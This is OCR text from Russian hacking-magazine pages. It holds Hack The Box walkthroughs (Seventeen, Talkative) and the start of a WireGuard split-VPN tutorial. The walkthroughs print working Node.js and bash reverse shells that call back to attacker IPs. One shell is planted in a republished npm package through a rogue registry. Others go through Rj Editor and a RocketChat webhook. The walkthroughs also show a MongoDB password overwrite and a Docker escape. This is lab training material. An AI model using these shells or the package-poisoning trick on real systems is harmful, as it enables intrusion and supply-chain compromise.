каталогом расположен файл PHP с тем же названием. Поэтому попробу ем
просканировать каталоги в дирек тории, в которые попадают заг ружаемые фай-
лы.


ffuf -u 'http://seventeen.htb:8000/oldmanagement/files/31234/FUZZ'
-w directory_2.3_medium_lowercase.txt -t 256




                  Резуль тат сканирования каталогов

Находим каталог papers, поэтому заг рузим реверс-шелл с названием papers.
php. Затем исполь зуем строку парамет ров из PoC, заменяя ею оригиналь ный
запрос.


_step=2&_product_name=Seventeen+Webmail&_plugins_qwerty=
../../../../../../../../../var/www/html/oldmanagement/files/31234/
papers&submit=UPDATE+CONFIG





                        Новый запрос

И на наш листенер (я исполь зую pwncat-cs) получаем бэк коннект.





                    Новая сессия pwncat-cs


ÏÐÎÄÂÈÆÅÍÈÅ
Docker to Host
По названию хоста можно понять, что мы попали в докер. Так как на веб-сер-
вере кру тит ся несколь ко систем, мы можем получить учет ные дан ные. Хотя бы
из файлов для под ключения к базам дан ных.





                  Содержимое файла dbh.php

Получаем пароль, который нужно попробовать исполь зовать для разных служб,
к примеру SSH. Имя поль зователя узнаем из файла /etc/passwd.




                     Системный поль зователь

Под ключаем ся по SSH с найден ными учет ными дан ными и забираем поль -
зователь ский флаг.





                        Флаг поль зователя


Ïîëüçîâàòåëü Kali
Теперь, ког да мы получили доступ к хосту, нам необходимо собрать информа-
цию, поэтому расчехляем скрипты PEASS.




Что делать после того, как мы получили доступ в систему от имени поль зовате-
ля? Вариантов даль нейшей эксплу атации и повышения привилегий может быть
очень много, как в  Linux, так и в Windows. Чтобы собрать информацию
и наметить цели, можно исполь зовать Privilege Escalation Awesome Scripts
SUITE (PEASS) — набор скриптов, которые проверяют систему на автомате.


С помощью скрипта находим входящие сообщения поль зователя kavi.



                Входящие сообщения поль зователя kavi

Читаем и отмечаем для себя информацию о локаль ном репозитории пакетов
NPM.





               Содержимое входящего сообщения

Если это локаль ный репозиторий, то проверим откры тые порты, нас интересу -
ет порт 4873.





                      Прослушиваемые порты

Нужный нам порт открыт, и этот адрес должен быть указан в файле .npmrc.





                   Содержимое файла .npmrc

Так как в сообщении упоминался «старый лог гер», попробу ем найти в реестре
что-то с этим связан ное.


npm search log --registry http://127.0.0.1:4873




                        Найден ные пакеты

Доступен пакет db-logger. Это интересно, так как если файл работает с базой
дан ных, то он должен содержать учет ные дан ные.
   Установим пакет из локаль ного реестра.


npm install db-logger --registry http://127.0.0.1:4873





                      Установка пакета db-logger

А теперь просмотрим содержимое файла.





                  Содержимое файла logger.js

Находим еще один пароль, который позволяет получить новую сессию, уже
от имени поль зователя kavi.



                     Сессия поль зователя kavi


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Од но из первых мест, которые нужно проверить при повышении привиле-
гий, — настройки sudoers. Получить их можно коман дой sudo -l.





                        Настройки sudoers




Файл /etc/sudoers в Linux содержит списки команд, которые разные группы
поль зователей могут выполнять от имени администратора системы. Можно
просмотреть его как напрямую, так и при помощи коман ды sudo -l.



Узнаем, что мы можем выполнить коман ду /opt/app/startup.sh без ввода
пароля в привилегирован ном кон тек сте. Запустим этот скрипт и посмотрим,
что произойдет.





                   Запуск найден ного скрипта

По логам мы можем определить, что скрипт проверяет установленные пакеты
NPM, а если такого пакета нет, то происходит его поиск и установка. Если про-
верить каталог /opt/app/ до запуска и после, можем заметить, что там появ-
ляет ся нужный пакет loglevel.



                   Проверка каталога /opt/app/

В этом каталоге интересен файл index, где находим требование пакета
loglevel.





               Содержимое файла /opt/app/index.js

Тут появилась идея под менить loglevel, внед рив в него реверс-шелл. Но как я
ни пытался локаль но это сделать, ничего не получилось. Но есть и дру гой путь!
Дело в том, что менед жер пакетов NPM всег да проверяет адрес удален ного
репозитория в файле .npmrc.
  Давай укажем в качестве удален ного репозитория свой хост, а потом раз-
вернем локаль ный поставщик пакетов.


echo "registry=http://10.10.14.16:4873/" > ~/.npmrc

Для поставки пакетов будем исполь зовать утилиту verdaccio.


sudo npm install -g verdaccio
verdaccio -l 10.10.14.16:4873





                        Запуск verdaccio

Прог рамма запущена, отображает логи, поэтому мы можем перейти к сле-
дующему шагу и создать поль зователя.


npm adduser --registry http://0.0.0.0:4873/





                  Создание поль зователя verdaccio

Теперь скачаем пакет loglevel с GitHub, перейдем в каталог пакета и попробу -
ем его опубликовать. Как правило, мы получаем на этом этапе ошибку.


git clone https://github.com/pimterry/loglevel.git
npm publish --registry http://10.10.14.16:4873/





                     Публикация пакета loglevel

Для решения этой проблемы нам нужно просто убрать пакет с публикации
и опубликовать заново.


npm unpublish --registry http://10.10.14.16:4873/ --force





                  Удаление опубликован ного пакета

Перед  повторной публикацией давай запишем  реверс-шелл на  Node.js
в основные файлы loglevel: ./lib/loglevel.js и ./dist/loglevel.js.


(function(){
   var net = require("net"),
       cp = require("child_process"),
       sh = cp.spawn("bash", []);
   var client = new net.Socket();
   client.connect(4321, "10.10.14.16", function(){
       client.pipe(sh.stdin);
       sh.stdout.pipe(client);
       sh.stderr.pipe(client);
   });
   return /a/; // Prevents the Node.js application from crashing
})();

А теперь публику ем пакет заново. После публикации мы можем перейти
по указан ному адресу и проверить опубликован ные пакеты.


npm publish --registry http://10.10.14.16:4873/





                     Публикация пакета loglevel





                     Опубликован ные пакеты

Теперь вернемся на удален ный хост и снова выполним коман ду sudo /opt/
app/startup.sh. В логах verdaccio обнаружим обращение к пакетам loglevel
и mysql, а затем в окне листенера получим бэк коннект.





                     Логи сервера verdaccio





                            Флаг рута

У нас есть рутовый шелл, а значит, машина захвачена!
ВЗЛОМ





     ПРОХОДИМ ЦЕПОЧКУ ДОКЕР-
      КОНТЕЙНЕРОВ ДЛЯ ЗАХВАТА
              ХОСТА




В этом рай тапе по сложной машине с пло -
щад ки Hack The Box мы про эксплу ати руем
уяз вимость в CMS Jamovi для получения
учет ных дан ных, а затем попен тестим CMS
Bolt,    что бы    получить    управление             RalfHacker                                                                                          hackerralf8@gmail.com
над  Docker  и  тун нелиро вать  тра фик
на основной хост. После это го работа ем
с  базой  RocketChat  для  авто риза ции
в чате и получения RCE. Что бы повысить
при вилегии, раз берем ся с воз можностью
CAP_DAC_READ_SEARCH .




                     Под ключаться к машинам с HTB рекомендует ся
                        только через VPN. Не делай этого с компьютеров,
                       где есть важ ные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими учас тни ками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.155    talkative.htb

И запускаем сканирование портов.




Сканирование портов — стан дартный первый шаг при любой атаке. Он поз-
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инстру мент для сканирования — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действу ет в два этапа. На первом производит ся обычное быстрое сканиро-
вание, на втором — более тщатель ное сканирование, с исполь зованием име-
ющихся скриптов (опция -A).





                     Резуль тат работы скрипта





               Резуль тат работы скрипта (продолжение)

Наш ли пять откры тых портов:
 • 80, 3000 — веб-сервер Apache 2.4.52;
 • 8080, 8081, 8082 — веб-сервер Tornado 5.0.

При этом филь тру ется под ключение к порту 22 (SSH).
  С помощью утилиты WhatWeb узнаем, какие технологии исполь зуют ся
на обнаружен ных откры тых портах.


whatweb http://talkative.htb
whatweb http://talkative.htb:3000/
whatweb http://talkative.htb:8080/
whatweb http://talkative.htb:8081/
whatweb http://talkative.htb:8082/





                 Проверка исполь зуемых технологий

Из всего, что нашел WhatWeb, нас боль ше всего интересу ет плат форма Jamovi.





              Главная страница сайта http://talkative.htb:3000/


ÒÎ×ÊÀ ÂÕÎÄÀ
Нам доступен Rj Editor, а это очень лег кий способ получить удален ное выпол-
нение кода (RCE). Для создания реверс-шелла будем исполь зовать сайт
Online  Reverse  Shell  Generator.  Там  указываем  парамет ры,  такие
как локаль ные хост и порт, язык и целевую систему.





                       Online Reverse Shell Generator

Затем откры ваем листенер, можно скопировать коман ду из генератора.
А теперь откры ваем Rj Editor и передаем сгенерирован ный шелл в фун кцию
system. Отправляем на выполнение ком бинацией клавиш Ctrl + Shift + Enter.


system("bash -c 'bash -i >& /dev/tcp/10.10.14.11/4321 0>&1'",
intern=TRUE)





                                   Rj Editor RCE

И получаем удален ную коман дную оболочку.





                        Бэк коннект от сервера

По поль зователю и имени хоста понимаем, что находим ся в докер-кон тейнере.


ÒÎ×ÊÀ ÎÏÎÐÛ
Осматриваем ся в рабочем окру жении и в домаш нем каталоге рута находим
файл с расширением omv.





                  Содержимое каталога /root/

Перенесем этот файл на локаль ный хост для даль нейшего изу чения. Так
как файл малень кий, можем закодировать его в Base64, а потом декодировать
на локаль ном хосте.


cat /root/bolt-administration.omv | base64 -w0





                       Кодирование файла

Декодируем текст, а затем распаку ем как архив ZIP. В одном из файлов найдем
учет ные дан ные.


echo UEsDBBQA...mBgAAAAA= | base64 -d > bolt-administration.omv
unzip bolt-administration.omv





              Содержимое файла xdata.json (логины)





              Содержимое файла xdata.json (пароли)

Получаем следующие пары учет ных дан ных:


matt@talkative.htb : jeO09ufhWD<s
janit@talkative.htb : bZ89h}V<S_DA
saul@talkative.htb : )SQWGm>9KHEA

Я перепробовал разные ком бинации логинов и паролей, но доступа все равно
никуда получить не удалось. Однако находим почтовый адрес администратора
и, попробовав найден ные пароли для него, авторизу емся в CMS Bolt.





                  Главная страница http://talkative.htb/bolt


CMS Bolt — RCE
Bolt исполь зует Twig для шаблонов и позволяет управлять кон тентом и поль -
зователями. Это дает нам возможность записы вать код в новый файл или вно-
сить изменения в существу ющие файлы.
   Чтобы восполь зовать ся этой возможностью, перейдем к кон фигурацион -
ным файлам, затем выберем и откроем для редак тирования любой файл
на PHP.





                         Главное меню CMS Bolt





                      Список кон фигураций





              Содержимое файла cong/bundles.php

Нам нужно записать реверс-шелл в этот файл, а потом обратить ся к нему.
В качестве шелла можно исполь зовать знаменитый pentestmonkey, который
тоже есть в Online ReverseShell Generator.





                   Генерирование PHP-реверс-шелла

Коман дой rlwrap -cAr nc -lvnp 4321 откры ваем листенер, обращаем ся
к изменен ному файлу и получаем бэк коннект.





                    Получен ный бэк коннект


ÏÐÎÄÂÈÆÅÍÈÅ
Так как мы находим ся в докер-кон тейнере, нужно провести разведку, и лучшее
средство для этого — deepce. Заг ружаем его с локаль ного хоста при помощи
curl и выполняем.


curl http://10.10.14.11:8000/deepce.sh -o deepce.sh
chmod +x deepce.sh
./deepce.sh





                   Ин формация о кон тейнере

Ничего найти не удалось, но зато узнаем адрес «Докера» и адрес главного хос-
та. Текущий кон тейнер будем исполь зовать как прок си-хост, поэтому заг ружа-
ем на него Chisel и создаем тун нель Socks. Исполь зуем свой хост как сервер
и откры ваем порт 8080 для обратного под ключения:


./chisel.bin server -p 8080 --reverse




                      Логи сервера Chisel

На клиенте (удален ном хосте) выполняем под ключение к серверу:


./chisel.bin client 10.10.14.11:8080 R:socks




                       Логи клиента Chisel

Если тун нель будет успешно создан, в логах сервера обнаружим новую сес-
сию.





                      Логи сервера Chisel

Просканиру ем порты на главном хосте. Так как Docker исполь зует дру гой
сетевой интерфейс, резуль тат скана должен отличать ся от того, что мы выпол-
няли в самом начале. Для перенаправления трафика из Nmap в наш тун нель
будем исполь зовать ProxyChains. В кон фиг /etc/proxychains.conf внесем
запись socks5 127.0.0.1 1080. После чего запустим скан.


proxychains -q nmap 172.17.0.1





                   Резуль тат сканирования Nmap

Видим откры тый SSH. Не забыл, что у нас есть целая пачка учет ных дан ных?
Перебираем все ком бинации и в итоге авторизу емся от имени поль зователя
saul.





                          Сессия SSH




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




         ПРОХОДИМ ЦЕПОЧКУ ДОКЕР-КОНТЕЙНЕРОВ
                          ДЛЯ ЗАХВАТА ХОСТА





DOCKER
MongoDB
Сканирование хоста ничего интересного нам не дает, поэтому посмотрим
на запускаемые процессы. Для этого применим утилиту pspy64 . В логах
pspy64 находим запуск какого-то скрипта /root/.backup/update_mongo.py.





                    Вы вод утилиты pspy64

На самом хосте базы MongoDB нет, поэтому, скорее всего, происходит под -
ключение к базе на удален ном хосте. Коман дой netstat -tulpan проверим
сетевые соединения.





                     Сетевые соединения

В списке есть хост 172.17.0.2. Так как тун нель уже создан, просканиру ем
порт 27017.


proxychains -q nmap -p27017 -A 172.17.0.2





                   Резуль тат сканирования портов

От лично, мы наш ли MongoDB. Рань ше с этой базой я работал с помощью
DBeaver, но теперь под держка MongoDB в ней толь ко за денежку, поэтому
юзаем утилиту mongosh , которую нужно установить на свой хост.


wget https://downloads.mongodb.com/compass/mongodb-mongosh_1.3.1_
amd64.deb
sudo dpkg -i mongodb-mongosh_1.3.1_amd64.deb

После установки mongosh нам требует ся «прокинуть» порт 27017 на наш хост.
Для этого снова исполь зуем Chisel.


# local host
./chisel.bin server -p 8081 --reverse


#remote host
./chisel.bin client 10.10.14.11:8081 R:27017:172.17.0.2:27017

Весь трафик, который мы отправим на локаль ный порт 27017, будет тун -
нелирован на порт 27017 указан ного хоста (172.17.0.2) через хост-клиент
Chisel. Теперь под ключим ся к базе.


mongosh "mongodb://LOCALHOST:27017"





                   Под ключение к базе MongoDB

Первым делом получаем список баз дан ных.


show databases





                       Список баз дан ных

Обращает на себя внимание база admin. Просмотрим таблицы.


use admin
show tables





                   Список таблиц в базе admin

Я получил вывод ключей, но это ничего мне не дало, кроме пред положения,
что у нас высокие права.


db.system.keys.find()





                Содержимое таблицы system.keys

Тог да я перешел даль ше — к базе meteor. В ней очень много таблиц, в том
числе и users, содержимое которой нам боль ше всего интересно.


use meteor
db.users.find()





                  Содержимое таблицы users

И это таблица RocketChat!


RocketChat RCE
Мы имеем доступ к базе RocketChat, при этом нам известно имя поль зователя
(admin). Из докумен тации узнаем, что можем сбросить пароль, точнее — уста-
новить дефолтный пароль 12345. Для этого нужно просто произвести запись
в базу дан ных.


db.getCollection('users').update({username:"admin"} , {$set : {
"services" : {"password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.
eizXIzLlRtgCh3GRLafOdR9ldAUh/KG"}}}})




                  Изменение пароля поль зователя

Запись прош ла успешно, поэтому авторизу емся в чате как admin:12345.





                       Главная страница RocketChat

Первым делом нам нужно узнать версию продук та. В RocketChat это вклад ка
«Администрирование → Информация».





                   Проверка версии RocketChat

Узнали, что исполь зует ся версия 2.4.14. Сразу стоит проверить, есть ли
для версии готовые эксплоиты. Самый надежный способ обнаружить такие
эксплоиты — поискать в интернете на сайтах вроде HackerOne, exploit-db,
а так же на GitHub.





                    Поиск эксплоита в Google

Хоть эксплоитов я и не нашел, но зато узнал, что для административных акка-
унтов RocketChat предоставляет интеграции, которые позволяют создавать
входящие и исходящие веб-хуки. Эти веб-хуки могут иметь связан ные с ними
скрипты, которые выполняют ся при срабаты вании веб-хука, а это и есть RCE!
Для создания новой интеграции выбираем опцию Администрирование →
Интеграции → Новая интеграция.





                    Создание новой интеграции

Вы бираем «Входящий веб-хук» и заполняем необходимые поля.





              Создание новой интеграции (продолжение)

В самом низу страницы требует ся указать исполь зование скрипта и написать
сам скрипт Node.js. Будем исполь зовать простой реверс-шелл.


const require = console.log.constructor('return process.
mainModule.require')();
(function(){
   var net = require("net"),
       cp = require("child_process"),
       sh = cp.spawn("bash", []);
   var client = new net.Socket();
   client.connect(5432, "10.10.14.11", function(){
       client.pipe(sh.stdin);
       sh.stdout.pipe(client);
       sh.stderr.pipe(client);
   });
   return /a/;
})();





              Создание новой интеграции (продолжение)

После сохранения интеграции и обновления страницы мы получим URL
веб-хука.





                   Получение токена веб-хука

Теперь осталось перейти по дан ной ссылке, и нам прилетит бэк коннект. Но тут
забегу вперед... Нам прилетит сессия в Docker, на котором будут урезаны нуж-
ные утилиты, и понадобит ся заг ружать в систему файлы, поэтому в качестве
листенера я исполь зовал pwncat , который запустит свой агент.


pip3 install pwncat-cs
pwncat-cs -m linux -lp 5432




                   Сессия поль зователя в pwncat


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Docker escape
И мы снова попадаем в Docker. Базовые перечисления системы мало чем
могут помочь, так как они преиму ществен но нужны для повышения привиле-
гий. Не так давно я нашел утилиту CDK, внут ри у которой чекер и множество
реализаций  методов  выхода  из  «Докера».  Заг ружаем  файл  в  Docker
с помощью коман ды upload, даем права на исполнение и запускаем авто-
чекер.


cdk_linux_amd64 auto-escape





               Проверка методов выхода из «Докера»

CDK нашел активную возможность CAP_DAC_READ_SEARCH, под сказывает, что
она нам дает, и отображает коман ду для эксплу атации.




В Linux поль зователь root получает особый кон текст при запуске любых про-
цессов. Так, ядро и приложения, работающие от имени root, обычно пропус-
кают любые ограничения, задан ные на действия в определен ном кон тек сте,
поэтому root может делать все, что захочет. Но что, если определен ному про-
цессу, который работает в непривилегирован ном кон тек сте, нужно выполнить
требующее привилегий действие, не повышая уровня прав?
   Например, бывает нужно разрешить процессу записы вать в журнал аудита
ядра, но не позволять отключить этот аудит. Ведь если запустить этот процесс
в кон тек сте рута, он сможет выполнить оба действия!
   Тут на помощь и приходят Linux capabilities. Эти «возможности» предос-
тавляют процессу не все множество привилегий, а какое-то его под множество.
Дру гими словами, все привилегии рута разбиваются на более мелкие незави-
симые друг от дру га привилегии и процесс получает толь ко те, которые ему
нужны.


Возможность  CAP_DAC_READ_SEARCH  позволяет процессу  обходить  права
на чтение для файлов и права на чтение и выполнение каталогов. Создавалась
она для поиска или чтения файлов, но так же предоставляет процессу раз-
решение на вызов open_by_handle_at. Любой процесс с возможностью
CAP_DAC_READ_SEARCH может исполь зовать open_by_handle_at для получения
доступа к любому файлу, даже к файлам за пределами своего пространства
имен при мон тировании разделов.
   Тог да сразу прочитаем флаг  рута, который расположен за пределами
докер-кон тейнера.


cdk_linux_amd64 run cap-dac-read-search /root/root.txt




                            Флаг рута

Машина захвачена!
ПРИВАТНОСТЬ





                     РАЗБИРАЕМСЯ
                     С WIREGUARD
                       И ДЕЛАЕМ
                 СВОЙ УМНЫЙ VPN





За бав ная ситу ация: сай тов и сер висов,
доступных только через VPN, все больше,
но при этом мно гие россий ские ком пании
зак рыва ют   доступ   из-за   гра ницы.
В результате при ходит ся целыми дня ми              vvzvlad                                                                              Любопытен. Ленив. Вреден.
теребить пол зунки  «вкл-выкл»,  что  уто -          xaker@vvzvlad.xyz
мительно. Я расска жу,  как с помощью
магии мар шру тов и WireGuard, решить эту
проблему и сделать «умный» VPN, который
не надо отклю чать.


Если ты поль зуешь ся VPN, то и сам наверняка сталкиваешь ся с блокировками
зарубежного  трафика.  К  примеру,  могут  не  откры вать ся   pochta.ru,
leroymerlin.ru, rt.ru, avito.ru.
  Получается мем.





Каждый с этим борет ся как может. Например, на устройствах Apple род ными
средствами можно настроить автоматизацию, которая будет запускать VPN,
ког да откры ваешь определен ные приложения (например,  Twitter), а ког да
выходишь из них — вык лючать обратно. Но это костыль, а хочет ся все сделать
красиво, да еще и прокачать навык работы с сетью.
  Поэтому мы сейчас попробу ем «включать чуть-чуть VPN».




                     При таком использовании это скорее прокси, а не
                      VPN, но любые методы обхода блокировок теперь
                       называ ют VPN, так  что, сделав эту оговорку,
                      дальше рас сла бимся и будем делать как все.


Заодно чуть улучшим качество связи с локаль ными ресурсами: необходимость
таскать трафик сначала до VPN вне страны, а потом обратно до сервера внут ри
нее драматично сказывается если не на скорости, то на задержке точно. Даже
на провод ном интернете пинг в 4 мс до Яндекса лег ко превращается в 190 мс,
а на мобиль ном интернете — из 80 мс в 240 мс. Дополнитель ный хоп внут ри
страны чуть ухуд шит дело, но далеко не так драматично.
  Делать все мы будем на основе WireGuard — это относитель но новая (раз-
рабаты вает ся с 2016 года, в отличие от OpenVPN и IPsec: первый — это двух-
тысячные, а второй еще рань ше) технология VPN. Создал ее, по сути, один
человек — zx2c4, которого в миру зовут Джейсоном Донен фель дом. Плюсы
WG — скорость (особен но для Linux, где он может работать как модуль ядра,
начиная с Kernel 5.6, и Windows, где модуль для ядра выпустили около недели
назад), низкие задержки, современ ная криптография и простая настройка
и исполь зование конечным юзером.
   Ах да, еще UDP. UDP для тун нелей — это хорошо, потому что у TCP уже есть
механизмы, которые позволяют ему работать на неидеаль ных соединениях,
а UDP пред ставляет собой имен но такое соединение. А ког да ты засовы ваешь
TCP в TCP, то отказываешь ся от боль шей части этих механизмов (инкапсу лиро-
ван ный TCP-пакет будет гаран тирован но доставлен дру гой стороне, хотя про-
токол допускает недоставку), но все еще несешь весь оверхед вида «хен дшейк
соединения для отправки хен дшейка».
  Не говоря уж о том, что инкапсу лировать UDP в TCP — ничуть не лучшая
идея, потому что сразу рушит все пред положения всяких скайпов о том, что
лучше пропустить пару пакетов, чем умень шить задержку: каждый UDP-пакет
в этом слу чае будет принудитель но послан заново и доставлен коррек тно,
не считаясь с зат ратами времени.
  Особен но для одинокого поль зователя-хакера приятна работа с шиф-
рованием: нет необходимости ни в сертификатах и удостоверяющих цен трах,
ни в логинах-паролях, все, что нужно, — обменять ся публичны ми ключами
с пиром, с которым ты хочешь установить соединение. Для боль ших ком паний
это, конечно, будет скорее минусом, как и то, что WG — это толь ко базовая
часть полноцен ной боль шой инфраструк туры VPN. Но имен но WireGuard
исполь зовали, к примеру, в Cloudare для своего WARP, правда, написав его
собствен ную реализацию — boringtun.
  Еще один минус WG — то, что трафик не обфусцирован и глу бокая инспек -
ция пакетов (DPI) выявит и позволит заблокировать такое соединение (не
говоря уж о блокировке UDP совсем, что почти не мешает работать с вебом,
но гаран тирован но ломает WireGuard). Для скры тия трафика рекомен дует ся
исполь зовать специализирован ное ПО —  Cloak,  Obfsproxy, Shadowsocks,
Stunnel, SoftEther, SSTP или, в кон це кон цов, простой SSH. Часть из этих инс-
тру мен тов может работать совместно с WG, а часть способна его заменять
в качестве инстру мен та стеганог рафии: WG изначаль но создавался под ско-
рость и криптографическую защищен ность.
   Если очень упрощать, ключи работают следующим образом: у нас есть зак -
рытый (приват ный) ключ, из которого можно сгенерировать откры тый, или пуб-
личный. Наоборот, из откры того ключа получить зак рытый мы никак не можем.
Затем мы шифруем с помощью зак рытого ключа какую-то строку, а при
помощи откры того расшифру ем ее и тем самым убедим ся, что у собесед ника
точно есть зак рытый ключ, а значит, он тот, за кого себя выдает. Таким обра-
зом, мы можем без проблем передавать откры тый ключ — он всего лишь поз-
воляет проверить под линность автора, но не прит ворить ся им.
  Это как в SSH — публичный ключ лежит на сервере, где его потеря —
неболь шая  беда:  все,  что сможет  сделать  с ним  злоумыш ленник, —
это положить его на свой сервер, чтобы ты мог под ключить ся  к нему
с помощью зак рытого ключа.
   Так вот, в WG на первом этапе под ключения каждая сторона с помощью
зашифрован ного приват ным ключом сообщения доказы вает собесед нику, что
она имен но она: это проверяется публичным ключом.
   Второй этап — создание с помощью этих ключей и матана сим метричных
ключей для шифрования самого трафика. Благодаря тому что расшифровать
зашифрован ное публичным ключом нель зя без приват ного, мы сможем соз-
дать ключ для сим метричного шифрования и отправить его по защищен ному
каналу. Этот шаг необходим потому, что сим метричное шифрование гораздо
менее ресурсоем кая операция, а минус у нее толь ко один: необходимо син -
хронизировать ключ между сторонами, при том что перехват ключа треть ей
стороной ведет к возможности расшифровки трафика.
  Но эта проблема решается с помощью асим метричной схемы. Это называ-
ется протокол Диффи — Хеллмана — способ защищен ного получения общего
сек ретного ключа. В WG исполь зует ся ECDH — вариация Диффи — Хеллмана
на эллиптических кривых. Первые два этапа в терминах WG называются
рукопожатием или хен дшейком.
Затем сим метричные ключи исполь зуют ся для шифрования трафика. Раз в две
минуты происходит новое рукопожатие и сессион ные ключи меняются.
   Разумеется, в реаль ности все нем ного сложнее: например, отправляют ся
не сами ключи, а сгенерирован ные на их основе эфемерные ключи, которые
удаляют ся  сразу  после  операции.  Заин тересовавшихся  под робностями
отправляю к крат кому описанию на сайте WireGuard.
  Мы же перейдем к более прак тическим действиям.


ØÀÃ 1. ÑÎÇÄÀÅÌ È ÍÀÑÒÐÀÈÂÀÅÌ ÄÂÀ ÑÅÐÂÅÐÀ

Один сервер будет внут ри страны — через него трафик пойдет на локаль ные
ресурсы, а второй — за границей. Даль ше я их буду называть local и external .
  Идеаль но, если local будет в твоей домаш ней сети, потому что при этом
трафик на внеш ние ресурсы не отличает ся от твоего домаш него трафика.
Но для этого нужен какой-то хост дома, белый IP и возможность пробросить
порт. У меня это виртуалка на домаш нем сервере, но, наверное, подойдет
и Raspberry Pi или аналогичный одноплат ник.




                    Ва риант с одноплат ником я не тес тировал и не
                        уверен, что он сра бота ет. Raspberry Pi при дет ся
                     маршру тизи ровать  весь  тра фик  с  устрой ств
                      и держать в памяти около 11 тысяч маршру тов;
                       ресурсов на это может не хва тить.


Если дома хоста нет, можно взять любой сервер у хостера VDS. Увы, некото-
рые сайты блокиру ют под сети хостеров, опасаясь ботов, так что это менее
пред почтитель ный вариант.
  А вот внеш нюю машину можно арен довать и у хостера. К примеру, у RU
VDS и VDSina есть зарубежные площад ки. А можно выбрать иностран ного хос-
тера, если найдешь способ оплачивать его услу ги. Например, я исполь зую
исланд ский 1984.hosting, созданный специаль но для параноиков.
  Считаем, что на обоих серверах у нас Debian 11.
   Ставим нужные нам пакеты:


apt update && apt install -y wireguard iptables ipcalc qrencode
curl jq traceroute dnsutils ufw

Включаем перенаправление трафика: в этом слу чае сервер, получив пакет,
который не пред назначает ся ни одному из его IP-адресов, не отбросит его,
а попытается перенаправить в соот ветствии со своими маршру тами.


echo "net.ipv4.ip_forward=1" > > /etc/sysctl.conf
echo "net.ipv4.conf.all.forwarding=1" > > /etc/sysctl.conf
sysctl -p /etc/sysctl.conf

Опциональ но (но очень удобно) сразу поменять hostname обоих серверов, что-
бы не запутать ся, где какая кон соль:


hostnamectl set-hostname trickster-internal


hostnamectl set-hostname trickster-external




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИПРИВАТНОСТЬ




                                РАЗБИРАЕМСЯ
                              С WIREGUARD
                                И ДЕЛАЕМ
                           СВОЙ УМНЫЙ VPN





ØÀÃ 2. ÍÀÑÒÐÀÈÂÀÅÌ WIREGUARD ÄËß ÑÂßÇÈ ÄÂÓÕ ÑÅÐÂÅÐÎÂ

Для начала генерируем ключи. Запускаем два раза wg genkey и получаем два
приват ных ключа:


root@trikster-internal:~# wg genkey
kOd3FVBggwpjD3AlZKXUxNTzJT0+f3MJdUdR8n6ZBn8=
root@trikster-internal:~# wg genkey
6CCRP42JiTObyf64Vo0BcqsX6vptsqOU+MKUslUun28=

Утилита wg genkey не делает ничего волшебного, это просто аналог чего-то
в таком духе:


echo $RANDOM | md5sum | head -c 32 | base64

Толь ко наверняка более слу чайное: мы просто генерируем 32 байта слу чайных
значений и пред ставляем их в виде Base64.
  Создаем два кон фига. Один на internal :


/etc/wireguard/wg-internal.conf
[Interface]
Address = 10.20.30.1/32
ListenPort = 17968
PrivateKey = kOd3FVBggwpjD3AlZKXUxNTzJT0+f3MJdUdR8n6ZBn8=
PostUp = iptables -t nat -A POSTROUTING -o `ip route | awk '/
default/ {print $5; exit}'` -j MASQUERADE
PostUp = ip rule add from `ip addr show $(ip route | awk '/
default/ { print $5 }') | grep "inet" | grep -v "inet6" | head -n
1 | awk '/inet/ {print $2}' | awk -F/ '{print $1}'` table main
PostDown = iptables -t nat -D POSTROUTING -o `ip route | awk '/
default/ {print $5; exit}'` -j MASQUERADE
PostDown = ip rule del from `ip addr show $(ip route | awk '/
default/ { print $5 }') | grep "inet" | grep -v "inet6" | head -n
1 | awk '/inet/ {print $2}' | awk -F/ '{print $1}'` table main

Второй на external :


/etc/wireguard/wg-external.conf
[Interface]
Address=10.20.30.2/32
PrivateKey=6CCRP42JiTObyf64Vo0BcqsX6vptsqOU+MKUslUun28=
PostUp = iptables -t nat -A POSTROUTING -o `ip route | awk '/
default/ {print $5; exit}'` -j MASQUERADE
PostDown = iptables -t nat -D POSTROUTING -o `ip route | awk '/
default/ {print $5; exit}'` -j MASQUERADE

Сек ция [Interface] —  это настройки кон крет ного сетевого интерфейса
WireGuard, того, что будет виден в ip a. Название интерфейса берет ся из наз-
вания текущего файла кон фигурации. У одного интерфейса всег да одна клю-
чевая пара: у пиров этого интерфейса одинаковый публичный ключ.
  Но ник то не мешает, если хочет ся, сделать для каждого пира отдель ный
кон фиг и отдель ный интерфейс (правда, на сот нях клиентов это будет неудоб-
но).
   Управляются интерфейсы обычно при помощи утилиты wg-quick :
wg-quick down wg-external и wg-quick up wg-external




                       Ути лита   wg-quick  —   это   на   самом
                      деле 400 строк на баше, которые автомати зиру -
                     ют час то используемые вещи, например уста нов-
                           ку маршру тов. Наличие туннеля само по себе
                       не  дает  ничего,  кроме защищенной  «тру бы»,
                        за которой находит ся дру гой пир. Чтобы твой
                       запрос в бра узере попал в интерфейс, сис теме
                      надо явно ска зать: «Маршру тизи руй, пожалуй ста,
                       пакеты с таким-то адресом назначения вот в этот
                       сетевой интерфейс».
                     Именно этим занима ется wg-quick. Ну еще и
                       нас трой кой адресов DNS, ука занных в конфиге,
                        уста новкой MTU и еще парой вещей. Но ничего
                      слож ного в этом нет, дос таточ но сделать cat /
                   usr/bin/wg-quick, чтобы пос мотреть на эту
                          логику, и, если надо, повторить то же самое
                        руками.


 • Interface-Address — это IP текущего пира. Вся адресация в WG статичес-
   кая. С одной стороны, это упрощает настройку и бутстрап, с дру гой сто-
   роны, усложняет работу, если у тебя очень много клиентов.
 • ListenPort — это UDP-порт для под ключения извне. Если не указать, будет
   прослушивать 51820.
